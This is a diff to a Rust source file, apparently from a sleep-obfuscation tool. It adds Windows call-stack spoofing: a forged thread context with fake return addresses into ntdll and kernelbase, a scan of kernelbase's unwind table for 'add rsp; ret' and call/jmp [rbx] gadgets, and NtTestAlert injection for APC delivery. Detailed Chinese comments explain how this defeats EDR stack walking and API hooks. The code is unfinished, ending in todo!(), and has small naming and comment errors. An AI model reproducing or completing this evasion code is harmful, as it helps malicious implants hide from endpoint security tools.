@@ -8,10 +8,11 @@ use core::{ops::Add, ptr::null_mut, slice::from_raw_parts};
 
 use crate::config::Config;
 use crate::error::HypnusError::{
-    FailToAllocateGadgetPointerPage, FaileToChangeMemoryToRx, MissingUnwindRtlUserThreadStart,
+    AddRspGadgetNotFound, FailToAllocateGadgetPointerPage, FaileToChangeMemoryToRx, FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection, MissingUnwindRtlUserThreadStart
 };
 use crate::error::Result; // replace anyhow::Result
-use crate::gadget::GadgetKind;
+use crate::gadget::{GadgetKind,scan_runtime};
+use crate::hypnus::Obfuscation;
 use crate::types::*;
 use crate::winapis::{NtAllocateVirtualMemory, NtLockVirtualMemory, NtProtectVirtualMemory};
 use crate::{debug_log, stealth_bail};
@@ -90,7 +91,7 @@ pub struct StackSpoof {
     enum_date_size: u32,
 
     /// stack frame size for RtlAcquireSRWLockExclusive
-    rtl_acquire_srw_size: u32,
+    rlt_acquire_srw_size: u32,
 
     /// type of gadget(call [rbx] or jmp [rbx])
     gadget: GadgetKind,
@@ -239,23 +240,112 @@ impl StackSpoof {
     #[inline]
     pub fn spoof_context(&self, cfg: &Config, ctx: CONTEXT) -> CONTEXT {
         unsafe {
-  // Construct a fake execution context for the current thread,
+            // Construct a fake execution context for the current thread,
             // simulating a call stack that chains through spoofed return addresses
-            let mut ctx_spoof = CONTEXT {   
+            let mut ctx_spoof = CONTEXT {
                 // CONTEXT_FULL代表接管当前线程下所有寄存器
                 ContextFlags: CONTEXT_FULL,
                 ..Default::default()
             };
 
+            // set the instruction pointer(rip) to the address of ntdll!ZwWaitForWorkViaWorkerFactory(该函数是win线程池空闲时待命处):cpu即将从该合法函数中返回
+            ctx_spoof.Rip = cfg.zw_wait_for_worker.as_u64();
+
+            // compute the spoofed rsp by subtracting减 all stacked frame sizes and extra aligment
+            // 从当前栈顶rsp(高地址)向下跳跃5个0x1000(每个4k)共计20k空间.详见注释
+            // 将rsp下移20k,用于edr hook/os内核切换的临时数据.以rsp-20k为基准,再下移伪造的函数调用链中函数的栈帧大小和32字节影子空间大小.
+            ctx_spoof.Rsp = (ctx.Rsp - 0x1000 * 5)
+                - (cfg.stack.rtl_user_thread_size
+                    + cfg.stack.base_thread_size
+                    + cfg.stack.rlt_acquire_srw_size
+                    + 32) as u64;
+
+            // Return to mtdll!RtlAcquireSRWLockExclusive + 0x17 (after call):将RtlAcquireSRWLockExclusive内部0x17处的rip地址写入栈空间(这个栈空间是上面ctx_spoof.Rsp扩展的).写入的位置是修改后的新栈顶(低地址).这个写入纯粹是静态decoy诱饵,用来应对edr的被动栈回溯,不会被cpu真正执行
+            // 这里为啥是0x17,在spoof.md中
+            *(ctx_spoof.Rsp as *mut u64) = cfg.rtl_acquire_lock.as_u64().add(0x17);
+
+            // return to BaseThreadInitThunk + 0x14(此处为其子函数RtlAcquireSRWLockExclusive执行完ret后,返回到BaseThreadInitThunk内部的合法指令返回点,即代码偏移0x14处的mov指令):模拟BaseThreadInitThunk调用其子函数RtlAcquireSRWLockExclusive的物理行为
+            // +8 :跳过返回地址本身8字节.详见spoof.md
+            *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + 8) as u64) as *mut u64) =
+                cfg.base_thread.as_u64().add(0x14);
+
+        // Return to RtlUserThreadStart + 0x21
+            *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + cfg.stack.base_thread_size + 16) as u64)
+                as *mut u64) = cfg.rtl_user_thread.as_u64().add(0x21);
+
+        // End a call stack.伪造调用链在物理空间的终结
+            // 三层伪造函数的栈深;24代表三层函数的返回地址
+            // 0:win的内存模型中,0/NULL时合法的栈底标志.当os内核/EDR调用RtlVirtualUnwind递归查找父函数时,如果解析出rip在有效模块中会继续回溯,如果解析出的返回地址为0,回溯流程正常终止
+           *(ctx_spoof.Rsp.add(
+                (cfg.stack.rlt_acquire_srw_size
+                    + cfg.stack.base_thread_size
+                    + cfg.stack.rtl_user_thread_size
+                    + 24) as u64,
+            ) as *mut u64) = 0;
+        
+        ctx_spoof
 
         }
-        
-        
-        
-        
-        
-        todo!()
+
     }
+
+
+
+/// Applies a fake call stack layout to a series of thread contexts:在物理内存中,把当前线程上下文(CONTEXT)强行改造成一条连贯的,无破绽的系统合法调用链(ROP)
+    /// simulating a legitimate execution.
+pub fn spoof(&self,ctxs:&mut [CONTEXT],cfg:&&Config,kind:Obfuscation)->Result<()> {
+    
+// 得到kernelbase.dll的运行时函数表(.pdata异常表即image_runtime_function)
+// 因为edr在stack walking时,会去.pdata表中验证每个返回地址是否属于一个合法注册的非叶子函数.我们寻找的gadget必须位于.pdata注册的合法函数体内
+        let pe_kernelbase = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
+        let Some(tables)=pe_kernelbase.entries() else {
+            stealth_bail!(FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection,"failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section")
+        };
+
+// Locate the target COP(Call-Oriented Programming) or JOP(Jump-Oriented Programming) gadget:均为绕过DEP(数据执行保护)/ASLR(地址空间随机化),也是rop链的终点
+// gadget_addr为kernelbase.dll中call [rbx]或jmp [rbx]指令地址;gadget_size为包含这个指令的宿主函数在系统注册的栈帧大小
+        // kernelbase中包含大量以 0xFF 0x13(call [rbx]) 或0xFF 0x23(jmp [rbp])结尾的gadgets
+        let (gadget_addr, gadget_size) = self.gadget.resolve(cfg)?;
+
+        // add rsp, 0x58 ; ret:
+        // 在kernelbase模块中,根据runtime_function找到对应的机器码的指令地址(rip目标)和其宿主函数的栈帧大小
+        // 0x48(REX.W):扩展前缀,指定接下来的指令操作数为64位;0x83,0xC4(ADD RSP,imm8):0x83为ADD;0xC4指定目标寄存器RSP;0x58:要增加的数值0x58(十进制88),这里add跳过指定的0x58空间,从一个深层的系统函数转到另一个函数,在跳转时需要预留32字节影子空间+寄存器(函数通常会备份3-5个寄存器,每个8字节)+16字节的栈对齐.这里是作者通过大量逆向发现,0x58可以一次性跳过大多数系统函数的prolog,让cpu落在预设的下一个返回地址
+        // 0xC3:RET;tables代表一个Image_runtime_function数组;add_rsp_addr代表找到的gadget在内存中的VA;add_rsp_size代表找到的gadget所占栈空间大小
+ let Some((add_rsp_addr, add_rsp_size)) = scan_runtime(
+            cfg.modules.kernelbase.as_ptr(),
+            &[0x48, 0x83, 0xC4, 0x58, 0xC3],
+            tables
+        )else {
+            stealth_bail!(AddRspGadgetNotFound,"add rsp gadget not found")
+        };
+
+unsafe {
+// 当当前线程混淆结束,引导程序回到真实的执行流:
+    for ctx in ctxs.iter_mut() {
+        ctx.Rbp=match kind {
+
+            // 
+            Obfuscation::Timer | Obfuscation::Wait=>ctx.Rsp,
+// 
+Obfuscation::Foliage=>{
+    // Inject NtTestAlert as stack return address to trigger APC delivery
+
+    (ctx.Rsp as *mut u64).write(cfg.nt_test_alert.into());
+                        ctx.Rsp
+}
+
+        }
+    }
+}
+
+
+
+    todo!()
+}
+
+
+
+
 }
 
 // 注释1
@@ -281,3 +371,11 @@ impl StackSpoof {
 // 这里使用的copy_nonoverlapping:编译器取消上述检查机制,调用cpu底层向量化指令(如AVX/SIMD),把内存字节高效的强行冲刷进去,速度极快.但如果有重叠,会导致素数孙华,引发UB.但在本文件中,bytes是准备好的opcode,gadget_code 是在内存新申请的,二者绝不可能重叠
 // 相对调用WriteProcessMemory/RtlCopyMemory等api向内存写入数据,core::ptr::copy_nonoverlapping不留下IAT,避免因edr hook敏感api被发现.因为它只是一个编译器内置指令Intrinsic,在编译出的.exe中,它会被翻译成底层的cpu指令.hook只能挂在API层面,对于cpu的汇编指令级别的内存读写,完全不知道在内存中写入了一段gadget代码
 // 以上,如果能确定源/目标数据是不同内存中的,就绝不会有交叉,就可用copy_nonoverlapping （memcpy），享受极致性能.如果是同一数组/同一buffer中左右移动的情况,就必须使用copy memmove来让os判断正向/逆向挪动,避免被数据覆盖.
+
+// 注释5
+// 20k怎么计算出来的:
+// 1. 保护主线程执行环境:根据整个项目,主线程首先执行RtlCaptureContext.主线程捕获RtlCaptureContext时,虽然将其挂起.但在整个混淆链转换中(从主线程到线程池工作线程的异步调度),os内核/EDR/线程池回调内部,依然可能有部分残留指令执行并使用当前栈(ctx.rsp)附近向下的区域.如果把伪造栈紧贴着ctx.rsp写入,任何微小的写入都可能覆盖主线程原本数据/局部变量/返回地址,一旦解密唤醒后试图恢复主线程环境,程序会因为栈损坏而崩溃(Access Violation).因此需要腾出部分空间确保主线程数据的安全.
+// 2. win的栈保护页Guard page限制:win中,栈内存是按需动态提交的.线程创建时,os只commit几十k的物理内存,其余reserve.在已提交和未提交额你存交界,放一个保护也page_guard.当程序正常向低地址使用栈时,若碰到page_guard,cpu会触发STATUS_GUARD_PAGE_VIOLATION异常.win内核捕获此异常后,会自动提交下一页,将page_guard下移.(栈扩张限制:cpu无法跳过保护页去访问未提交区域,如跳过访问会触发STATUS_ACCESS_VIOLATION  导致程序崩溃).
+// win64下,默认线程池worker线程通常预先提交64-256k栈空间.20k既保证足够缓冲区,也确保这个地址范围仍在线程池预先提交的栈安全区内,不需要触发栈扩张,避免跳过page_guard导致崩溃的风险.这也是选择gap=20k这个数字的上限
+// 以上,在主线程执行调用链期间,经历了多个os和edr的函数调用.这些都会在当前栈中写入一些临时数据.如果这个gap太小,一旦深层嵌套的os调用或edr进行复杂的内存审计,其部分数据会放在rsp下方,栈指针可能向下延申并覆盖掉主线程原本的局部变量.如 edr的hook函数在执行ret返回时,会发现它的返回地址被覆盖了,那么主线程会因为栈被写坏,在内核切换的瞬间直接触发Access Violation（C0000005） 崩溃退出
+// 这里也可以设为24k/28k等
